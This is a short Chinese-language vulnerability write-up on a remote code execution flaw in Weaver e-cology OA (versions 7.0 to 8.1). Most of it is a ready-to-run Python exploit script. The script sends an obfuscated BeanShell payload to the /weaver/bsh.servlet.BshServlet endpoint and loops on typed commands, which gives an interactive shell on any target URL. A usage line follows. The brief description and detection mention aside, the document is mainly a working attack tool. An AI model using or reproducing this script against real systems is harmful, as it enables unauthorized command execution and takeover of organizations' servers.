## 前言  

泛微e-cology OA远程代码执行|泛微OA管理系统RCE漏洞利用脚本

## 漏洞简介  

泛微OA管理系统RCE漏洞：攻击者可通过精心构造的请求包攻击易受损的泛微OA用户，实现任意代码执行，进而获取系统Shell。企业用户可以使用腾讯御知检测企业网络资产是否存在该漏洞。

## 漏洞危害  

攻击者可通过精心构造的请求包攻击易受损的泛微OA用户，实现任意代码执行，进而获取系统Shell

## 影响范围  

### 产品  

> 泛微e-cology

### 版本  

> 包括不限于7.0，8.0，8.1版  

### 组件  

> 泛微e-cology  

## 漏洞复现  

```python
import requests
import sys

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Content-Type': 'application/x-www-form-urlencoded'
}


def exploit(url,cmd):
    target=url+'/weaver/bsh.servlet.BshServlet'
    payload='bsh.script=eval%00("ex"%2b"ec(\\"cmd+/c+{}\\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'.format(cmd)
    res=requests.post(url=target,data=payload,headers=headers,timeout=10)
    res.encoding=res.apparent_encoding
    print(res.text)

if __name__ == '__main__':
    url=sys.argv[1]
    while(1):
        cmd=input('cmd:')
        exploit(url,cmd)
```
USAGE：python e-cology-rce.py http://target.com/ 根据提示输入需要执行的命令即可检测